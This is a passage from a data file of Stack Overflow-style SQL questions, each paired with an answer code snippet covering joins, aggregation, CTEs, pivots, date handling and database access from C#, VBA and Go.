                        from tablename 
                        where val>@const 
                        group by item
                               ) lastover
        on tablename.item = lastover.item
        and tablename.[date]> lastoverdate
    group by tablename.item
) below
    on tablename.item = below.item
    and tablename.date = below.mindate
"
2929,42648,XMLdata.modify Condition,";WITH XMLNAMESPACES ('uri' as ns)
UPDATE Document
SET
    XMLdata.modify('
        insert text{""New value""} 
        into (/ns:root/Field)[1]
    ')
WHERE 
     (XMLData.exist('(/ns:root/Field/text())[1]')=0)
AND condition;
;WITH XMLNAMESPACES ('uri' as ns)
UPDATE Document
SET 
    XMLdata.modify('
    replace value of (/ns:root/Field/text())[1]
    with ""Replaced value""
')
WHERE condition;
"
30655,14201,Return the data are Max Datetime and different identity different row - MYSQL,"SELECT        *
FROM          tbl_locate AS a
INNER JOIN     
(
    SELECT    MainID, Max(DateTime) AS DateTime
    FROM      tbl_locate
    GROUP BY  MainID
) AS b
ON            a.MainID = b.MainID
AND           a.DateTime = b.DateTime
WHERE b.MainID in(1,2,3)
"
36037,46675,Edit Current Object's SQL in MS Access through VBA,"MsgBox Application.Screen.ActiveDatasheet.RecordSource
"
29805,5483,I need to get the first log in database java,"SELECT name, loginDate, MIN( loginTime )
FROM   logins
GROUP BY name, loginDate
"
26409,22923,CASE / IF Statement to declare variable based on parameter value,"select @Date1 = (case when @Param1 = 'Last Month'
                      then CONVERT(DATE,DATEADD(dd,-DAY(GETDATE())+1,DATEADD(mm,-1,GETDATE())))
                      when @Param1 = 'Current Month'
                      then CONVERT(DATE,DATEADD(dd,-DAY(GETDATE())+1,GETDATE()))
                      else CONVERT(DATE,GETDATE()-1)
                  end);

select @Date2 = (case when @Param1 = 'Last Month'
                      then CONVERT(DATE,DATEADD(dd,-DAY(GETDATE())+1,GETDATE()))
                      when @Param1 = 'Current Month'
                      then CONVERT(DATE,GETDATE())
                      else CONVERT(DATE,GETDATE())
                  end);
"
16543,1550,"IsNull is slow, do I have other option?","AND ( 
           (tA.Prop2= tB.Prop2) 
        OR (tA.Prop2 IS NULL AND tB.Prop2 IS NULL )
     )
"
26369,1399,SQL max condition in double join,"select p.lastname, max(w.numberofpages)
from writes w
inner join person p on p.id = w.author
inner join books b on b.title = w.book
group by p.lastname, p.id
"
17976,23060,Can I change isolation level in Oracle?,"set transaction isolation level serializable;  
set transaction isolation level read committed;
"
22412,15804,Fastest Way to extract from SQL Lite in C#,"Dispatcher UIDispatcher = Dispatcher.CurrentDispatcher;
BackgroundWorker bw = new BackgroundWorker();
bw.DoWork += (sender,e) =>
{
    // Use a linq query to yield an IQueryable/IEnumerable List of data from DB
    foreach(Data data in DataList)   // Enumerated here
    {
        UIDispatcher.Invoke(DispatcherPriority.ContextIdle, new Action(() => 
        { 
            myOC.Add(data);
        }));
    }    
};
"
31412,44680,how to access remote sql server database from vb.net windows form application,"Data Source=x.x.x.x,1433;Network Library=DBMSSOCN;Initial Catalog=myDataBase;User ID=myUsername;Password=myPassword;
"
11490,62404,FirstOrDefault call in entity framework is cached but database is changed,"var dbOrganisation = repository.DbOrganisation.AsNoTracking().FirstOrDefault(c => c.Id == id);
"
36790,2387,inner join with m/n relationship tables and sum of a certain column,"SELECT users.*, 
       codes.code, 
       Sum(users.downloads) AS _downloadscount 
FROM   users 
       LEFT JOIN (codes 
                  INNER JOIN codes_users 
                          ON codes.id = codes_users.code_id) 
              ON users.id = codes_users.user_id 
GROUP  BY users.id; 
"
19078,72106,Optimal MYSQL query for longest prefix matching in a table with 5 million rows,"-- Index now needs to be (rsid, num, length)

SELECT
  *
FROM
  dummy_table
INNER JOIN
  your_search_table
    ON dummy_table.num = your_search_table.num
WHERE
  rsid = '123'
ORDER BY
  dummy_table.length
LIMIT
  1
"
18671,39029,CREATE TABLE where multiple columns are inserted with same value,"CREATE TABLE Test (
  ID int NOT NULL IDENTITY(1,1),
  OverrideSortIndex int,
  Name nvarchar(50) NOT NULL,
  SortIndex AS ISNULL(OverrideSortIndex, ID)
);  
"
39655,17111,Data blobs are xml that have been base64 need to be decoded and stored,"DECLARE @x XML='<root><Test name=""checkTest"">TestValue</Test></root>';
SELECT @x;

--This is the XML string in base64
DECLARE @xBase64 VARCHAR(MAX)='PHJvb3Q+DQogIDxUZXN0IG5hbWU9ImNoZWNrVGVzdCI+VGVzdFZhbHVlPC9UZXN0Pg0KPC9yb290Pg==';

CREATE TABLE #testBase64(ID INT, SomeBLOB VARBINARY(MAX));
INSERT INTO #testBase64 VALUES(1,CAST(@xBase64 AS VARBINARY(MAX)));

SELECT ID 
      ,SomeBLOB                          AS TheBLOB_as_HexString
      ,CAST(SomeBLOB AS VARCHAR(MAX))    AS TheBLOB_back_to_Base64

      --taken from here: http://stackoverflow.com/a/32231832/5089204
      ,CAST(CAST(CAST(CAST(SomeBLOB AS VARCHAR(MAX)) AS XML).value('.','varbinary(max)') AS VARCHAR(MAX)) AS XML) AS Back_to_XML

FROM #testBase64;

DROP TABLE #testBase64;

/*
    The results
    Hex-String: 0x50484A766233512B44516F67494478555A584E304947356862575539496D4E6F5A574E725647567A6443492B5647567A64465A686248566C504339555A584E305067304B504339796232393050673D3D
    Base64:     PHJvb3Q+DQogIDxUZXN0IG5hbWU9ImNoZWNrVGVzdCI+VGVzdFZhbHVlPC9UZXN0Pg0KPC9yb290Pg==
    XML again:  <root><Test name=""checkTest"">TestValue</Test></root>
*/
"
5797,47445,Efficient way to get data from multiple joins on a table,"where tableB.created_on = (select max(created_on)
                           from tableB b2
                           where b2.a_id = tableA.id
                          ) and
       . . . /* the rest of your conditions here */
"
14571,55382,Variable is not working at condition,"SELECT day1,day1leg1,day1leg2,hccyamt,pfid,pcfcccy,pcfcbank,maturitydate,availeddate 
FROM rskpcfc
WHERE pcfcid='''pc14-46-119'' or pcfcid=''pc14-47-119'''
"
28117,35439,Do I have to list all the possible FK in the database design?,"SELECT c.CUSTOMER_ID, ..., p.PAYMENT_ID, ...
FROM CUSTOMER c,ORDER o,INVOICE i,PAYMENT p
WHERE c.CUSTOMER_ID = o.CUSTOMER_ID
and o.ORDER_ID = i.ORDER_ID
and i.INVOICE_ID = p.INVOICE_ID 
"
30064,36991,Fill null columns between not null columns with default value,"update #Levels
set 
level1 = CASE WHEN COALESCE(level2, level3, level4, level5, level6, level7, level8, level9, level10) IS NULL THEN level1 ELSE ISNULL(level1, 'def') END,
level2 = CASE WHEN COALESCE(level3, level4, level5, level6, level7, level8, level9, level10) IS NULL THEN level2 ELSE ISNULL(level2, 'def') END,
level3 = CASE WHEN COALESCE(level4, level5, level6, level7, level8, level9, level10) IS NULL THEN level3 ELSE ISNULL(level3, 'def') END,
level4 = CASE WHEN COALESCE(level5, level6, level7, level8, level9, level10) IS NULL THEN level4 ELSE ISNULL(level4, 'def') END,
level5 = CASE WHEN COALESCE(level6, level7, level8, level9, level10) IS NULL THEN level5 ELSE ISNULL(level5, 'def') END,
level6 = CASE WHEN COALESCE(level7, level8, level9, level10) IS NULL THEN level6 ELSE ISNULL(level6, 'def') END,
level7 = CASE WHEN COALESCE(level8, level9, level10) IS NULL THEN level7 ELSE ISNULL(level7, 'def') END,
level8 = CASE WHEN COALESCE(level9, level10) IS NULL THEN level8 ELSE ISNULL(level8, 'def') END,
level9 = CASE WHEN COALESCE(level10, null) IS NULL THEN level9 ELSE ISNULL(level9, 'def') END
"
37579,10387,SQL select menus which have no submenu,"SELECT T1.*
FROM YOURTABLE T1 LEFT JOIN YOURTABLE T2 ON T1.ID = T2.REFER
WHERE T2.REFER IS NULL AND T1.REFER=0
"
26809,53899,Select From Table A but Exclude where a match exists in table B,"SELECT DISTINCT s.EmailAddress
   , 'GoPro' AS CampaignName
  , sl.SendDate
FROM Subscribers s 
LEFT JOIN SendLog sl 
  ON s.EmailAddress = sl.EmailAddress
  AND CampaignName = 'GoPro'
WHERE s.Entitlement = 'PowerUser' 
AND s.SubscribePreference = 1
AND sl.EmailAddress IS NULL
"
35842,25490,MySQL joining tables Q,"SELECT doctor.doctor_id, COUNT(appt_time) AS No_APP, person.Last_name
FROM doctor LEFT JOIN appointment ON doctor.doctor_id = appointment.doctor_id 
             LEFT JOIN person on person.doctor_id = doctor.doctor_id 
GROUP BY doctor.doctor_id;
"
31781,22203,T-SQL GO Statement n Times,"INSERT INTO DatesTable  SELECT DateAdd(day, 1, MAX(DatesTable.Dates)) from DatesTable
GO 10
SELECT * FROM DatesTable
"
12043,4963,Better/shorter way to close database connection in Go,"func performQuery(q string, op func(db.rows)) {
    rows := db.MyPg.Conn.QueryRows(q)
    // defer rows.Close()
    op(rows)
    rows.Close()
}

// then we could do:
performQuery(`SELECT * FROM bla`,func(rows db.Rows) {
  for rows.Next() {
    // rows.Scan(      
  }
})
"
35795,493,SQL Database Design for Test Data,"CREATE TABLE device
(  id         BIGINT AUTO_INCREMENT PRIMARY KEY
,  DevID      INT
,  DataPoint  VARCHAR
,  INDEX(DevID))
"
37249,19221,Query - Sum with Conditions in Partition Clause?,"Sum(case when ColB = 1 and ColC > 0 then ColC else 0 end) over(partition by ColA)
"
10639,19543,Oracle wm_concat to get one row then Case to check value,"select   ...
         wm_concat(job_type) as myJob_Type,
         sum(decode(job_type,'Painter',1,0))
from     ...
group by ...
"
36272,42051,"Adding a ""total sum"" row with a select statement in Mysql","SELECT   IFNULL((CASE
           WHEN a.account_number = '123456' THEN 'Savings'
           WHEN a.account_number = '123321' THEN 'Credit'
         END), ""Total"") AS ""Account""
FROM accounts a
GROUP BY a.account_number WITH ROLLUP;
"
1837,8200,Implementing transactions over multiple databases,"using (TransactionScope ts = new TransactionScope())
{
    //all db code here

    // if an error occurs jump out of the using block and it will dispose and rollback

    ts.Complete();
}
"
28557,3497,Using LIKE and IN and a Subquery in a single SQL Statement,"SELECT UserID, CASE WHEN EXISTS 
(
  SELECT 1 FROM dbo.Users WHERE UserPeers LIKE '%' + u.UserID + '%'
) THEN 'I am in Column1' ELSE UserID END
FROM dbo.Users AS u;
"
1593,17714,Find the last inserted row that matches a query,"SELECT * 
FROM table_name
WHERE `mail` = 'someone@example.com'
ORDER BY id DESC
LIMIT 1
"
30234,1438,How do I split a string so I can access item x?,"Declare @products varchar(200) = '1|20|3|343|44|6|8765'
Declare @individual varchar(20) = null

WHILE LEN(@products) > 0
BEGIN
    IF PATINDEX('%|%',@products) > 0
    BEGIN
        SET @individual = SUBSTRING(@products, 0, PATINDEX('%|%',@products))
        SELECT @individual

        SET @products = SUBSTRING(@products, LEN(@individual + '|') + 1,
                                                     LEN(@products))
    END
    ELSE
    BEGIN
        SET @individual = @products
        SET @products = NULL
        SELECT @individual
    END
END
"
15082,30917,Updating a table from another table,"UPDATE Availability
    SET LessonTaken = 'Y'
WHERE Availability.studentID <> 0 AND
      (SELECT LessonID
       FROM Lesson
       WHERE Availability.StudentID = Lesson.StudentID
      );
"
25022,9728,SQL Help. Trying to achive a certain result set,"WITH CTE AS
(
    SELECT  *,
            RN = ROW_NUMBER() OVER(PARTITION BY ID ORDER BY LastChanged DESC)
    FROM dbo.TableName
    WHERE  TypeID = @TypeID
)
SELECT Id, LastChanged, TypeId  
FROM CTE
WHERE RN = 1
"
11998,42816,Postgres sql select result based on a ranking derived from a text column,"select distinct on (date) *
from t
order by date, run desc
"
12581,15877,SQL/Rails find records where zero associated records are in a given state,"SELECT * FROM projects
WHERE id NOT IN (
    SELECT project_id
    FROM people_projects
    WHERE state IN ('interested', 'left', 'kicked')
)
"
8868,67943,Unioning select statements in SQL,"SELECT Datepart(dw, t1.Date) AS D1,
       Datename(dw, t1.Date) AS Day_of_Week,
       Avg (CASE WHEN rreq.Influenced = 1 THEN T1.LengthSec + T1.Sec END) Infl_AHT,
       Avg (CASE WHEN rreq.Influenced = 0 THEN T1.LengthSec + T1.Sec END) Non_inf_AHT
FROM   bm.t1agent t1 WITH (nolock)
       JOIN prc.Route rreq
         ON t1.id = rreq.ID
       JOIN PRC.Routing rraw WITH (nolock)
         ON rreq.ID = rraw.Id
WHERE  t1.Date >= '2014-12-07'
GROUP  BY ROLLUP (( Datepart(dw, t1.Date), Datename(dw, t1.Date) )) 
"
31350,41068,Remove seconds from datetime," SELECT CAST(DATEPART(DD,GETDATE()) AS VARCHAR)+'/'
+CAST(DATEPART(MM,GETDATE()) AS VARCHAR)
+'/'+CAST(DATEPART(YYYY,GETDATE()) AS VARCHAR)
+' '+CAST(DATEPART(HH,GETDATE()) AS VARCHAR)
+':'+CAST(DATEPART(MI,GETDATE()) AS VARCHAR)
"
23134,68770,SQL: Flatten hierarchy with missing levels,"select id
     , [H1], [H2], [H3], [H4], [H5]
from
( 
  select distinct
         coalesce(c6.id,c5.id,c4.id,c3.id,c2.id,c1.id) as id
       , c1.id as lid
       , c1.level 
    from ttt c1
    left join ttt c2
      on c1.id = c2.pid
    left join ttt c3
      on c2.id = c3.pid
    left join ttt c4
      on c3.id = c4.pid
    left join ttt c5
      on c4.id = c5.pid
    left join ttt c6
      on c5.id = c6.pid ) as sourcetable
  pivot ( max(lid) 
    for level in ([H1], [H2], [H3], [H4], [H5])
    ) as pivottable;
"
20256,49137,SQL query FROM variable tables,"    SELECT
        ep.type_attendant AS `type`,
        ep.id_attendant   AS id,
        CONCAT( u.firstname, ' ', u.lastname ) AS fullname
    FROM
        events_attendants ep
      JOIN
        events e    ON ep.id_event = e.id 
      JOIN
        users u     ON ep.id_attendant = u.id
    WHERE
        ep.type_attendant = 'user'
UNION ALL
    SELECT
        ep.type_attendant,
        ep.id_attendant,
        g.name  
    FROM
        events_attendants ep
      JOIN
        events e    ON ep.id_event = e.id 
      JOIN
        groups g    ON ep.id_attendant = g.id
    WHERE
        ep.type_attendant <> 'user'
"
28634,48876,Count the records in a temp variable table,"SET @index = 90 * (SELECT COUNT(mark) FROM @TempMarks)
"
18839,11497,Oracle sql to count instances of different values in single column - continuation,"select *
from
(
  select tkey, status, 
    decode(status, 30, 30, 40, 30,status) as col
  from tableB b
  left join tableA a
    on a.fkey = b.fkey
) src
pivot
(
  count(status)
  for col in ('20' as Count_Status20, 
              '30' as Count_Status3040,
              '50' as Count_Status50)
) piv;
"
36095,28889,SQL - WHERE query with a mix of XOR and AND on two variables,"WHERE (X is NULL OR foo=X) AND (Y is NULL OR bar=Y)
"
26830,38078,MySQL - Show All Permutations?,"CREATE TABLE person
SELECT 1 AS Id, 100 AS MyFK, 'John' AS f_name, 'Doe' AS l_name UNION
SELECT 2, 100, 'Little', 'Timmy';

CREATE TABLE vehicle
SELECT 1 AS Id, 100 AS MyFK, 'Car' AS item, 200 AS price UNION
SELECT 2, 100, 'Bike', 100;

SELECT p.Id, p.MyFK, p.f_name, p.l_name, v.item, v.price
FROM person p
CROSS JOIN vehicle v;
"
20768,7041,SQLite - Group by where more than x,"select *,count(*) from [p-ticket_links] ptls

inner join 

(SELECT
ts2.id as 'p-id', 
ts.resolved as 'd-resolved'
FROM [tickets] ts 
inner join [p-ticket_links] ptl on [ptl].link=ts.id
inner join [d-ticket_servers] dts on dts.id=ts.id
inner join [tickets] ts2 on ptl.pticket=ts2.id
inner join [p-ticket_versions] ptvs on ptvs.id=ts2.id

where [ts].type='Deployment'
and dts.server='Live Server'
and ts.summary like '%upgrade%'
and ts2.project_type='Upgrade'
and ts.state <> 'Duplicate') dres on dres.[p-id]=ptls.pticket

inner join [tickets] ts on ts.id=ptls.link
inner join [tickets] ts2 on ts2.id=ptls.pticket

where ts.ticket_type='S'
and ts2.project_type='Upgrade'
and ts.created > dres.[d-resolved]

group by ptls.pticket
"
20395,43596,"Can I selectively create a backup of Postgres database, with only certian tables?","pg_dump -t '(A|B|C)'
"
32245,51086,How to find SQL Server queries that took a lot of time?,"SELECT TOP 10
    total_worker_time/execution_count AS Avg_CPU_Time
        ,execution_count
        ,total_elapsed_time/execution_count as AVG_Run_Time
        ,(SELECT
              SUBSTRING(text,statement_start_offset/2,(CASE
                                                           WHEN statement_end_offset = -1 THEN LEN(CONVERT(nvarchar(max), text)) * 2 
                                                           ELSE statement_end_offset 
                                                       END -statement_start_offset)/2
                       ) FROM sys.dm_exec_sql_text(sql_handle)
         ) AS query_text 
FROM sys.dm_exec_query_stats 
ORDER BY AVG_Run_Time DESC
"
7076,1288,Create a Range From n to 1 in SQL,"DECLARE @N INT = 96

;WITH E1(N) AS( -- 10 ^ 1 = 10 rows
    SELECT 1 FROM(VALUES (1),(1),(1),(1),(1),(1),(1),(1),(1),(1))t(N)
),
E2(N) AS(SELECT 1 FROM E1 a CROSS JOIN E1 b), -- 10 ^ 2 = 100 rows
E4(N) AS(SELECT 1 FROM E2 a CROSS JOIN E2 b), -- 10 ^ 4 = 10,000 rows
E8(N) AS(SELECT 1 FROM E4 a CROSS JOIN E4 b), -- 10 ^ 8 = 10,000,000 rows
CteTally(N) AS(
    SELECT TOP(@N) ROW_NUMBER() OVER(ORDER BY(SELECT NULL))
    FROM E8
)    
SELECT * FROM CteTally ORDER BY N DESC
"
24004,49021,Password invisible in AlLTER USER statement,"    ALTER USER username password expire;
"
17112,17464,Query to complete empty spaces on table in Postgres,"select date_format(a.date,'%m/%d/%Y') as date, b.value as value 
from table_a as a join 
    (select b1.date as start, IFNULL(min(b2.date),'9999-12-31') as end, b1.value as value
            from table_b as b1 left outer join table_b as b2
            on b1.date < b2.date
            group by b1.date) as b
on a.date >= b.start and a.date < b.end
"
9975,53633,MYSQL: Average count from multiple tables,"SELECT m.m_id, AVG(CASE WHEN muo_type_id = 1 THEN 1 ELSE 0 END) AS ""Avg Open""
FROM mailing m
Left join
 mailing_received mr
on mr.m_id = m.m_id
Left join
mailing_open_type mot 
ON mr.u_id = mot.u_id
GROUP BY m.m_id;
"
26597,73141,sql show distinct column,"select ID, Name, 
  case (select count(*) from table t2 where t2.Name=t1.Name and t1.ID > t2.ID)
    when 0 then 1
    else null
  end as Result
from table t1
"
13486,8239,Where date difference between now and max date value is greater than X,"select * from 
(SELECT usermaster.userid, date_trunc('days', now()-max(paymentdate)) as  
        last_payment
from usermaster, paymentdetail 
where usermaster.userid=paymentdetail.userid
group by usermaster.userid ) as temptab
where last_payment>100;
"
21033,44145,How to get the number of distinct records in a SQL Server 2008 database?,"select
    count( distinct Country_Country_Id ) 
from users
"
14393,203,Derived table in SQL Server,"SELECT FirstTable.*, SecondTable.LargestOrder
FROM (
  SELECT EmailAddress, Orders.OrderID, SUM(ItemPrice * Quantity) AS OrderTotal
  FROM Customers  
  JOIN Orders ON Customers.CustomerID = Orders.CustomerID
  JOIN OrderItems ON Orders.OrderID = OrderItems.OrderID
  GROUP BY EmailAddress, Orders.OrderID) as FirstTable
JOIN (
  SELECT EmailAddress, MAX(ItemPrice) as LargestOrder 
  FROM Customers  
  JOIN Orders ON Customers.CustomerID = Orders.CustomerID
  JOIN OrderItems ON Orders.OrderID = OrderItems.OrderID
  GROUP BY EmailAddress) as OtherTable ON FirstTable.EmailAddress = OtherTable.EmailAddress
"
32037,54344,"How do I display a number as $#,### in SQL?","declare @v money
set @v = 1234.567 
select '$' + parsename(convert(varchar(20), @v, 1), 2) 
"
3694,62321,COUNT() Function in conjunction with NOT IN clause not working properly with varchar field (T-SQL),"SELECT COUNT(*) FROM SomeTable S1 
WHERE NOT EXISTS (SELECT * FROm SomeOtherTable S2 WHERE S1.[MyField] = S2.MyOtherField)   
"
8298,73004,SQL UNPIVOT? is this what i should be using?,"select id, date1 mydate, status1 status
from mytable
union all
select id, date2 mydate, status2 status
from mytable
"
5475,63238,How to get list when running total crosses a set limit?,"select t.*
from (select t.*,
             (select sum(t2.qty)
              from t t2
              where t2.UniqName = t.UniqName and
                    t2.EntDate <= t.EntDate
             ) as cumsum
      from t
     ) t
where cumsum >= YOURLIMIT and cumsum - qty < YOURLIMIT;
"
10554,38787,Get average time per a visit,"SELECT avg(total_duration) as avgtime FROM 
   (SELECT sum(page_visit_duration) as total_duration, session_id FROM page_views group by session_id) sq
"
3311,21976,How to delete similar rows from my table in MySQL?,"DELETE a
FROM mytable a
JOIN mytable b ON (a.nid = b.nid
                AND a.vid = b.vid
                AND a.field_value = b.field_value)
WHERE a.delta > b.delta
"
15192,38837,Return rows in random order,"SELECT * FROM table
ORDER BY NEWID()
"
12130,3426,How do I compare overlapping values within a row?,"SELECT * FROM appts 
WHERE timeStart <='$timeEnd' 
AND timeEnd >='$timeStart' 
AND dayappt='$boatdate'
"
2000,73949,SQL - JOIN with MAX(created_at),"SELECT co.*, v.* 
FROM companies co 
LEFT JOIN 
( 
    SELECT 
    ca.* 
    FROM calls ca 
    JOIN 
    ( 
        SELECT 
        company_id, 
        MAX(created_at) AS max_created_at 
        FROM calls 
        GROUP BY company_id 
    ) t 
    ON ca.company_id = t.company_id AND ca.created_at = t.max_created_at
    GROUP BY company_id
) v ON co.id = v.company_id
"
17733,28213,SqlServer Stored Procedure with optional arguments,"CREATE PROCEDURE MySearch
    @Column1 DATETIME = NULL,
    @Column2 VARCHAR(50) = NULL,
    @Column3 SMALLINT = NULL
AS
SELECT column1,column2,column3 
FROM t_searchable
WHERE (@Column1 IS NULL OR Column1 = @Column1)
AND (@Column2 IS NULL OR Column2 = @Column2)
AND (@Column3 IS NULL OR Column3 = @Column3)
"
16227,20622,How to do this query in T-SQL,"SELECT *
FROM Table
ORDER BY
   CASE A
      WHEN 'stack' THEN 1
      WHEN 'over' THEN 2
      WHEN 'flow' THEN 3
      ELSE NULL
   END
"
26015,63546,MYSQL SUM & INSERT,"INSERT INTO master_all
SELECT date as master_date
      ,name as master_name
      ,SUM(m_val1) as master_val1
      ,SUM(m_val2) as master_val2
      ,SUM(m_val3) as master_val3
      ,SUM(m_val4) as master_val4
      ,SUM(m_val5) as master_val5
      ,SUM(m_val6) as master_val6
FROM (
select a_date as date
      ,a_name as name
      ,a_val1 + a_val2 + a_val3 as m_val1
      ,0 as m_val2
      ,0 as m_val3
      ,0 as m_val4
      ,0 as m_val5
      ,0 as m_val6
from a1
union all
select b_date as date
      ,b_name as name
      ,0 as m_val1
      ,b_val1 + b_val2 + b_val3 + b_val4 + b_val5 as m_val2
      ,0 as m_val3
      ,0 as m_val4
      ,0 as m_val5
      ,0 as m_val6
from b1
UNION ALL
select c_date as date
      ,c_name as name
      ,0 as m_val1
      ,0 as m_val2
      ,c_val1 + c_val2 + c_val3 + c_val4 as m_val3
      ,0 as m_val4
      ,0 as m_val5
      ,0 as m_val6
from C1
UNION ALL
SELECT d_date as date
      ,d_name as name
      ,0 as m_val1
      ,0 as m_val2
      ,0 as m_val3
      ,d_val1 + d_val2 as m_val4
      ,0 as m_val5
      ,0 as m_val6
from D1
UNION ALL
SELECT e_date as date
      ,e_name as name
      ,0 as m_val1
      ,0 as m_val2
      ,0 as m_val3
      ,0 as m_val4
      ,e_val1 as m_val5
      ,0 as m_val6
from E1
UNION ALL
SELECT f_date as date
      ,f_name as name
      ,0 as m_val1
      ,0 as m_val2
      ,0 as m_val3
      ,0 as m_val4
      ,0 as m_val5
      ,f_val1 as m_val6
from F1
) as t
GROUP BY date, name
"
38867,71023,MySQL search algorithm for best match,"select *  from department  where Name like ""%Samsung"" or (Name like ""%Tv%"" and Name like ""%Samsung%"") UNION select  from department  where Name like ""%tv"" or (Name like ""%Samsung%"" and Name like ""%TV%"")
"
19918,2182,Query to find districts with at least one value in assets table,"select count(*)
from district
where exists (
    select 1
    from assets
    where district_id = district.id
)
"
12425,47275,INSERT from UNION of 2 selects?,"INSERT INTO Clean_Persons (user_ID, Loc_ID)
SELECT DISTINCT TO_NUMBER(P.USER_ID),   L.loc_ID 
FROM Location L JOIN Persons P 
ON (
   L.city = P.city AND
   L.state = P.state AND
   L.country = P.country 
);
"
30838,39555,many-to-many and many-to-many intersections,"SET @personID := 1;

SELECT  c.name
FROM    Inventory a
        INNER JOIN Foods b
            ON a.food_id = b.id
        INNER JOIN Stores c
            ON a.store_id = c.id
        INNER JOIN Lists d
            ON d.food_id = b.id
WHERE   d.person_id = @personID
GROUP BY c.name
HAVING   COUNT(DISTINCT d.food_id) =
     (
        SELECT COUNT(*)
        FROM Lists
        WHERE person_ID = @personID
     )
"
6742,24186,What is the best way to separate hyphen-delimited data into several columns in SQL Server?,"CREATE TABLE Test
(
  LongText VARCHAR(400)
)

INSERT INTO Test (LongText)
VALUES('AA-BB-CCCCCCCC-DDDDDDDD-EEEE'),
('BB-CC-DDDDDDDD-EEEEEEEE-FFFF')

;WITH CTE AS
(
    --initial part
    SELECT LongText, 1 AS ColNo, LEFT(LongText, CHARINDEX('-', LongText)-1) AS Part,
      RIGHT(LongText, LEN(LongText) - CHARINDEX('-', LongText)) AS Remainder
    FROM Test
    WHERE CHARINDEX('-', LongText)>0
    --recursive part, gets 'Part' till the last '-'
    UNION ALL
    SELECT LongText, ColNo + 1 AS ColNo,LEFT(Remainder, CHARINDEX('-', Remainder)-1) AS Part,
      RIGHT(Remainder, LEN(Remainder) - CHARINDEX('-', Remainder)) AS Remainder
    FROM CTE
    WHERE CHARINDEX('-', Remainder)>0
    --recursive part, gets the last 'Part' (there is no '-')
    UNION ALL
    SELECT LongText, ColNo + 1 AS ColNo,Remainder AS Part,NULL AS Remainder
    FROM CTE
    WHERE CHARINDEX('-', Remainder)=0
)
SELECT [1],[2],[3],[4],[5]
FROM (
    SELECT LongText, ColNo, Part
    FROM CTE
  ) AS DT
PIVOT(MAX(Part) FOR ColNo IN ([1],[2],[3],[4],[5])) AS PT
"
26580,59482,How to count the number of months between two dates SQL,"SELECT EXTRACT(month from d) as month, count(*)
FROM generate_series('2010-8-24'::date, '2012-3-29'::date, '1 month'::interval) d
GROUP BY 1 
ORDER BY 1;

 month | count 
-------+-------
     1 |     2
     2 |     2
     3 |     2
     4 |     1
     5 |     1
     6 |     1
     7 |     1
     8 |     2
     9 |     2
    10 |     2
    11 |     2
    12 |     2
(12 rows)
"
28875,25928,Advanced (probably not?) MYSQL query select statement,"SELECT Count(id) FROM data WHERE user = 3 AND seen = 0
AND date > (
    SELECT coalesce(MAX(date),0) FROM data WHERE seen <> 0 AND user = 3
);
"
840,15297,Using Decode as a like statement in oracle,"case
   when id_segmento like '%1%' then 'a'
   else 'b'
end
"
36108,29882,SQL query query,"select author_id, count(distinct genre_id) as genres
from books 
group by author_id 
having genres = N
"
24940,57130,Migrate from Oracle to SQL Server,"    WITH n(v_max_depth ) AS 
         (SELECT max(level)
          FROM EQUIP_D
          WHERE PARENT_EQUIP_NO IS NULL
               UNION ALL
          SELECT max(level)
          FROM EQUIP_D as nplus1, n
          WHERE n.EQUIP_NO= nplus1.PARENT_EQUIP_NO)

   SELECT max(v_max_depth) FROM n
"
13203,40176,SQL Select * and cast one of those variables,"select top 500 t1.*, 
cast(..) as <some clever alias> 
from db.tbl t1. 
"
33595,73284,How to group by using multiple conditions,"Select case When Type = 'A' then type + ltrim(str(subtype, 9))
            Else Type End Type, Sum(Value) Sum
From table
Group By case When Type = 'A' then type + ltrim(str(subtype, 9))
            Else Type End
"
4363,50650,rewrite query to remove inner query in tsql to optimize,";WITH CTE AS
(
 select CL.col1, CL.col2, cl.claimid
  FROM CLAIM CL WITH (NOLOCK) 
  INNER JOIN MEMBER MEM WITH (NOLOCK)     ON MEM.MEMID=CL.MEMID 
  LEFT  JOIN PAYVACATION PV WITH (NOLOCK) ON CL.CLAIMID = PV.CLAIMID 
 ),
CTE2 AS 
(
select PAYVACATION.paymentid , PAYVACATION.claimid
      ,ROW_NUMBER() OVER (PARTITION BY PAYVACATION.claimid 
                     ORDER BY payment.paystatusdate desc) rn 
 from PAYVACATION WITH (NOLOCK)
 INNER JOIN payment WITH (NOLOCK) ON PAYVACATION.paymentid = payment.paymentid 
 INNER JOIN CTE WITH (NOLOCK)     ON PAYVACATION.claimid = cl.claimid 
)
SELECT CL.col1, CL.col2
FROM CTE CL 
INNER JOIN CTE2 C2 ON C2.claimid = CL.claimid
                  AND C2.rn = 1
"
19805,59709,SQL select query about grouping 2 columns,"select
    videos as 'Number of videos',
    count(user_id) as 'Num of Users'
from (
   select
        count(distinct(topic_id)) as videos,
        user_id from topic_user
   group by
        user_id
 ) sub
 group by
    videos
"
1973,17702,SQL Select Create Colmun,"SELECT StartDate, YEAR(StartDate) AS Year
FROM table
"
23044,19473,How to order by multiple fields in MySQL?,"SELECT brand, type, transmission      
FROM tablename 
ORDER BY 
 case brand
  when 'toyota' then 1
  when 'honda' then 2
  when 'ford' then 3
 end ASC,
 case type
  when 'SUV' then 1
  when 'Sedan' then 2
  when 'Coupe' then 3
 end ASC,
 case transmission
  when 'manual' then 1
  when 'automatic' then 2
  when 'cvt' then 3
 end ASC
"
12669,9000,Show the structure of the table in SQL,"SELECT COLUMN_NAME, DATA_TYPE FROM ALL_TAB_COLUMNS WHERE TABLE_NAME='your_table_name';
"
32766,18265,Update [can check if the date is future ],"select distinct name from mytable
"
9719,27162,SQLite Query Display Name with WHERE condition - Multiple Tables,"SELECT t1.Project-ID, t1.Name
FROM Project AS t1
JOIN (
   SELECT Project-ID
   FROM Works_on 
   GROUP BY Project-ID
   HAVING COUNT(*) >= 3
) AS t2 ON t1.Project-ID = t2.Project-ID
"
24760,64788,SQL Query to look up data by Date intervals,"WITH cte AS (
    SELECT  s.Item,
            s.STATUS,
            DATEDIFF(DAY, GETDATE(), [Date]) DaysAgo
    FROM    Statuses s
),
statusCte AS (
    SELECT 
        Item,
        MIN(CASE WHEN DaysAgo = 0 THEN [Status] END) [Status Today],
        MIN(CASE WHEN DaysAgo Between -15 AND -1 THEN [Status] END) [Status 15 days ago],
        MIN(CASE WHEN DaysAgo Between -30 AND -16 THEN [Status] END) [Status 30 days ago],
        MIN(CASE WHEN DaysAgo < -30 THEN [Status] END) [Status 45 days ago]
    FROM
        cte
    GROUP BY
        Item
)
SELECT  
    Item,
